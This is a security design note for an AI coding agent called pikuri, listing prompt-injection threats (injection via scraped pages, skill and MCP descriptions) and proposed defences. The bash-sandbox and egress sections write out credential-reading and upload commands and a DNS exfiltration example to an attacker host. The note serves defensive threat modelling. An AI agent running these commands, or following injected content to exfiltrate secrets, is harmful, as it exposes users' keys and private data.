# Security open-questions log

Status: **open-questions log** — mitigations under consideration,
open observations, and prior-art notes that haven't graduated yet.
Promote an entry into a real plan (or its own long-form `ideas/` note)
when the friction shows up.

The *committed* model lives in [`../SECURITY.md`](../SECURITY.md): a
short code-trust baseline (pikuri + LLM trusted; project bash
sandboxed via Bubblewrap; MCP processes left to Docker), then the
load-bearing prompt-injection section (lethal trifecta broken by
privilege-separated sub-agents, MCP description injection caught by
`Mcp::Verifier`), three worked attacks, and explicit non-goals. This
file is the not-yet-committed counterpart.

Threat model scales with capability. `bin/pikuri-chat` today is
small surface (calculator + three stateless network-out tools, no
filesystem writes); `bin/pikuri-code` has the full
read/write/edit/bash kit and is where most of the below bites; an
eventual `bin/pikuri-assistant` with MCP-backed Gmail / Calendar /
Slack inherits both sets and adds the privacy-of-personal-data
axis.

Related long-form notes (the entries below that already grew one):

- `book/trifecta-detector.md` + {Pikuri::Trifecta} — the static
  capability-presence check, **shipped**;
  [`trifecta-detector.md`](trifecta-detector.md) keeps only its one
  unanswered question.
- [`private-context-taint.md`](private-context-taint.md) — the runtime
  private-in → sever-egress enforcement (and the long-form home of the
  egress-allowlist idea below).
- [`typed-transports.md`](typed-transports.md) — classify each
  LLM-shaped transport (chat / embedder / reranker) `:private` vs
  `:public` from its endpoint host and refuse to mix by default.
- [`bash-confirmer.md`](bash-confirmer.md) — the permission-model
  granularity / fatigue work (risk tiers, dry-run, session grants).
- [`more-confirmers.md`](more-confirmers.md) — the human-in-the-loop
  confirmer shapes and the structured-action-context seam.

## Trifecta — open mitigations beyond sub-agent separation

The structural defense (privilege-separated `RESEARCHER` and
`FILE_MINER` sub-agents) shipped and is documented in
[`../SECURITY.md`](../SECURITY.md) §"Prompt injection". The biggest
adjacent idea — a **structural trifecta detector** — shipped, and is
taught in `book/trifecta-detector.md`. Shorter adjacent ideas still on
the table:

- **Provenance tags around tool output** in the context render
  (untrusted-content markers). Cheap, partial — empirical
  question whether the model pays attention to
  `<untrusted>…</untrusted>` framing.
- **Private-context taint + egress levels** — the long-form
  runtime-enforcement design (coarse context taint on first private
  read; Sealed / Bounded / Off levels; `web_search` whitelisted by
  nature vs `fetch` exfil by nature):
  [`private-context-taint.md`](private-context-taint.md).
  Designed, not built.
- **Egress allowlist** for `fetch` / `bash` when in interactive
  mode (auto-deny non-allowlisted hosts, prompt for first-use
  additions). Note [`private-context-taint.md`](private-context-taint.md)
  **kills the user-curated `fetch` whitelist** (an interactive host is
  attacker-readable), so the surviving live shape is the `bash`-egress /
  network-layer version. Gondolin's egress-proxy pattern (see
  [`../COMPARISON.md`](../COMPARISON.md) §"Prior art deep-dive") is the
  heavyweight structural version.
- **Prompt injection inside skill descriptions?** Skills are
  user-installed text; current stance ([`../SECURITY.md`](../SECURITY.md)
  §"Code trust" — skills bullet) is "user-vetted by definition."
  A `Mcp::Verifier`-shaped pass for skills would belt-and-braces it.
- **Content-level defenses against `web_scrape` injection** beyond
  persona separation (provenance tags are the obvious shape).

## Unsandboxed Bash modes

`Code::Bash::Sandbox::Bubblewrap` constrains `Bash` to the workspace's
readable/writable roots + an OS-runtime baseline, and is the default in
`bin/pikuri-code`. The residual concern is `--no-sandbox` / `--yolo`:
there `cat ~/.ssh/id_rsa`, `env | grep -i key`,
`curl --upload-file ~/.aws/credentials ...` all run as the user, and
the per-command Confirmer is the only line of defense (`--yolo`
disables that too). The help text says "use only with an outer
sandbox" but nothing enforces it. Worth considering: detect a
container / VM at boot and refuse `--no-sandbox` outside one, or at
least surface a louder warning than the current `LOGGER.warn`.

## Egress is broader than `web_search`

Anywhere bytes leave the box: `bash` → curl/scp/dns/`ping -p`;
`fetch` with attacker-chosen URL; `write` into a Dropbox / iCloud /
git-tracked directory; markdown images rendered by a chat host that
fetches them; error messages echoed back into follow-up turns; the
LLM provider itself when non-local. DNS exfil
(`nslookup secret.attacker.com`) is sneaky — 60+ bytes per query, and
most egress firewalls don't filter port 53. This is why the trifecta
detector's `:egress` leg is tagged generously (an undeclared tool is
presumed to hold it — {Pikuri::Tool::TrifectaLegs::ASSUMED}), and why the killed
`fetch` whitelist can't be rescued by URL-shape heuristics (see
[`private-context-taint.md`](private-context-taint.md)).

## MCP — open ergonomic / supply-chain questions

The committed MCP story is split across [`../SECURITY.md`](../SECURITY.md):
the §"Code trust" bullet covers the Docker-for-untrusted-process
recommendation (suggested, not automatic); §"Defense: MCP
description verification" covers the `Mcp::Verifier` pre-flight
scan, with user-curation as the first line of defense. Open:

- **Per-tool first-use consent** (opencode-style sticky approval)
  is probably the right ergonomics shape — first invocation of
  the Gmail-MCP fetch tool is also the first consent prompt.
  Composes with the skill-gated lazy-add design.
- **First-class "wrap MCP in Docker" option** would close the
  supply-chain gap without leaving containerization to the user.
  Hard part: the wrapped MCP's egress / LLM-endpoint reachability
  re-opens the trifecta inside the container, so the egress
  policy of the inner Docker becomes the new question.

## Output-size DoS and cost

A 50MB scraped page → context window blown → API cost spike or OOM in
the tokenizer. `max_steps` covers the loop-count axis; a per-tool
output-byte cap covers the per-step axis. `Bash` (head+tail truncation
via `OUTPUT_HEAD`/`OUTPUT_TAIL`), `Read` (`MAX_BYTES`), and `WebScrape`
each enforce their own cap; remaining gap is a uniform shape across
all tools and disk-spillover of overflow (PI/opencode prior art —
tempfile path returned to the LLM).

## Misc smaller things

- **Logging hygiene.** `Pikuri.logger_for` shouldn't log Authorization
  headers, request bodies, or full search queries (which are often
  sensitive themselves).
- **`URLCache` on disk.** Cached pages with embedded auth cookies or
  sensitive scrape results — disk encryption matters, backups matter.
- **TOCTOU.** Mostly theoretical for an interactive agent, but
  `Workspace::Filesystem`'s check-then-open isn't atomic on POSIX.
- **Sub-agent context leak.** A child given less context than the
  parent can still leak parent context that flows in via the parent's
  "task" prompt.

## Prior art: how PI and opencode handle this

The deep survey of PI's two isolation weights (the bubblewrap-only
`sandbox` extension and the heavier Gondolin micro-VM, with its
egress-proxy + secret-placeholder pattern) and opencode's
tree-sitter-backed `(permission, glob)` permission system — plus the
"worth borrowing" shortlist — now lives in
[`../COMPARISON.md`](../COMPARISON.md) §"Prior art deep-dive", alongside
the higher-level permission/sandboxing comparison it extends. Findings
reinforce pikuri's framing rather than contradict it: neither project
ships prompt-injection defenses, both cap tool output to a tempfile,
both validate sub-agent privilege separation as the right shape.
